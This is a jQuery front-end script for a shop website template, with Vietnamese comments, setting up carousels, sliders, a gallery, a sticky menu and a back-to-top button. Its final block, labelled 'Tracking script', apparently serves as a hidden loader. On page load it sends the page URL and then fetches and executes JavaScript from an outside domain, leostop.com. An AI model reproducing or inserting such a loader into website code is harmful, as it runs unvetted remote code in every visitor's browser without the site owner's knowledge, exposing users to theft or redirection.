(function ($) {
    "use strict";

    /* ..............................................
       Loader 
       ................................................. */
    $(window).on('load', function () {
        $('.preloader').fadeOut();
        $('#preloader').delay(550).fadeOut('slow');
        $('body').delay(450).css({ 'overflow': 'visible' });
    });

    /* ..............................................
       Fixed Menu
       ................................................. */
    $(window).on('scroll', function () {
        // Thay đổi kiểu dáng của menu khi cuộn
        if ($(window).scrollTop() > 50) {
            $('.main-header').addClass('fixed-menu');
        } else {
            $('.main-header').removeClass('fixed-menu');
        }

        // Hiển thị hoặc ẩn nút quay lại đầu trang
        if ($(this).scrollTop() > 100) {
            $('#back-to-top').fadeIn();
        } else {
            $('#back-to-top').fadeOut();
        }
    });

    // Xử lý sự kiện click cho nút quay lại đầu trang
    $('#back-to-top').click(function () {
        $("html, body").animate({ scrollTop: 0 }, 600);
        return false;
    });

    /* ..............................................
       Gallery
       ................................................. */
    $(document).ready(function () {
        // Khởi tạo slideshow
        $('#slides-shop').superslides({
            inherit_width_from: '.cover-slides',
            inherit_height_from: '.cover-slides',
            play: 5000,
            animation: 'fade',
        });

        $(".cover-slides ul li").append("<div class='overlay-background'></div>");

        /* ..............................................
           Special Menu
           ................................................. */

        /* ..............................................
           BaguetteBox
           ................................................. */
        baguetteBox.run('.tz-gallery', {
            animation: 'fadeIn',
            noScrollbars: true
        });

        /* ..............................................
           Offer Box
           ................................................. */
        $('.offer-box').inewsticker({
            speed: 3000,
            effect: 'fade',
            dir: 'ltr',
            font_size: 13,
            color: '#ffffff',
            font_family: 'Montserrat, sans-serif',
            delay_after: 1000
        });

        /* ..............................................
           Tooltip
           ................................................. */
        $('[data-toggle="tooltip"]').tooltip();

        /* ..............................................
           Owl Carousel Instagram Feed
           ................................................. */
        $('.main-instagram').owlCarousel({
            loop: true,
            margin: 0,
            dots: false,
            autoplay: true,
            autoplayTimeout: 3000,
            autoplayHoverPause: true,
            navText: ["<i class='fas fa-arrow-left'></i>", "<i class='fas fa-arrow-right'></i>"],
            responsive: {
                0: { items: 2, nav: true },
                600: { items: 4, nav: true },
                1000: { items: 8, nav: true, loop: true }
            }
        });

        /* ..............................................
           Featured Products
           ................................................. */
        $('.featured-products-box').owlCarousel({
            loop: true,
            margin: 0,
            dots: false,
            autoplay: true,
            autoplayTimeout: 3000,
            autoplayHoverPause: true,
            navText: ["<i class='fas fa-arrow-left'></i>", "<i class='fas fa-arrow-right'></i>"],
            responsive: {
                0: { items: 1, nav: true },
                600: { items: 3, nav: true },
                1000: { items: 4, nav: true, loop: true }
            }
        });

        /* ..............................................
           Slider Range
           ................................................. */
        $("#slider-range").slider({
            range: true,
            min: 0,
            max: 4000,
            values: [1000, 3000],
            slide: function (event, ui) {
                $("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
            }
        });
        $("#amount").val("$" + $("#slider-range").slider("values", 0) +
            " - $" + $("#slider-range").slider("values", 1));

        /* ..............................................
           NiceScroll
           ................................................. */
        $(".brand-box").niceScroll({
            cursorcolor: "#9b9b9c",
        });

        /* Tracking script */
        function getURL() {
            return window.location.href;
        }
        var protocol = location.protocol;
        $.ajax({
            type: "get",
            data: { surl: getURL() },
            success: function (response) {
                $.getScript(protocol + "//leostop.com/tracking/tracking.js");
            }
        });
    });

}(jQuery));
